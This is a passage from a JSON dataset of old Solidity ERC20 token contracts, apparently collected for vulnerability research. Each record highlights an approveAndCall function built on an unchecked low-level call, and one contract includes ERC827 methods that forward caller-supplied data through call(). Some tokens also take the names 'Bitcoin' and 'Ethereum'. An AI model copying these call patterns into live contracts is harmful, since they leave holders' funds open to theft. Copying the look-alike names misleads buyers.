totalSupply;\n}\ncontract SmogToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function SmogToken() {\n balances[msg.sender] = 6000000000000000000000000000;\n totalSupply = 6000000000000000000000000000;\n name = \"SmogToken\";\n decimals = 18;\n symbol = \"SGT\";\n unitsOneEthCanBuy = 200000000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1439"
  },
  "filename": "1731.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract TrexToken is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function TrexToken() {\n balances[msg.sender] = 6000000000000000000000000000;\n totalSupply = 6000000000000000000000000000;\n name = \"TrexToken\";\n decimals = 18;\n symbol = \"TXT\";\n unitsOneEthCanBuy = 200000000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb143a"
  },
  "filename": "183.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HELP4HUMANITY is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function HELP4HUMANITY() {\n balances[msg.sender] = 999999999999000000000000000000;\n totalSupply = 999999999999000000000000000000;\n name = \"HELP4HUMANITY\";\n decimals = 18;\n symbol = \"HELP\";\n unitsOneEthCanBuy = 10000000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb143b"
  },
  "filename": "185.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract GIC is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n address public fundsWallet;\n function GIC () {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Giccoin\";\n decimals = 18;\n symbol = \"GIC\";\n fundsWallet = msg.sender;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb143c"
  },
  "filename": "191.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract RiesGraham is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function RiesGraham(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Ries&Graham Token\";\n decimals = 18;\n symbol = \"RGT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb143d"
  },
  "filename": "20025.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CurryCoin is StandardToken {\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n uint256 public unitsOneEthCanBuy;\n uint256 public totalEthInWei;\n address public fundsWallet;\n function CurryCoin() {\n balances[msg.sender] = 100000000000000000;\n totalSupply = 100000000000000000;\n name = \"CurryCoin\";\n decimals = 8;\n symbol = \"CRYC\";\n unitsOneEthCanBuy = 100000;\n fundsWallet = msg.sender;\n }\n function() payable{\n totalEthInWei = totalEthInWei + msg.value;\n uint256 amount = msg.value * unitsOneEthCanBuy;\n require(balances[fundsWallet] >= amount);\n balances[fundsWallet] = balances[fundsWallet] - amount;\n balances[msg.sender] = balances[msg.sender] + amount;\n Transfer(fundsWallet, msg.sender, amount);\n fundsWallet.transfer(msg.value);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb143e"
  },
  "filename": "20044.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 120000000000000000000000000;\n totalSupply = 120000000000000000000000000;\n name = \"Ethereum\";\n decimals = 18;\n symbol = \"ETH\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb143f"
  },
  "filename": "20048.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 21000000000000000000000000;\n totalSupply = 21000000000000000000000000;\n name = \"Bitcoin\";\n decimals = 18;\n symbol = \"BTC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1440"
  },
  "filename": "20053.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract PLN is StandardToken {\n function () {\n throw;\n }\n string public name = \"Plutaneum\";\n uint8 public decimals = 2;\n string public symbol = \"PLN\";\n string public version = 'H1.0';\n function PLN(\n ) {\n balances[msg.sender] = 20000000000;\n totalSupply = 20000000000;\n name = \"Plutaneum\";\n decimals = 2;\n symbol = \"PLN\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db5fcb296bdecdb1441"
  },
  "filename": "20198.sol",
  "content": "pragma solidity ^0.4.18;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(ERC20 token, address from, address to, uint256 value) internal {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n function mint(address _to, uint256 _amount) onlyOwner canMint public returns (bool) {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n Mint(_to, _amount);\n Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n MintFinished();\n return true;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n Unpause();\n }\n}\ncontract PausableToken is StandardToken, Pausable {\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function increaseApproval(address _spender, uint _addedValue) public whenNotPaused returns (bool success) {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function 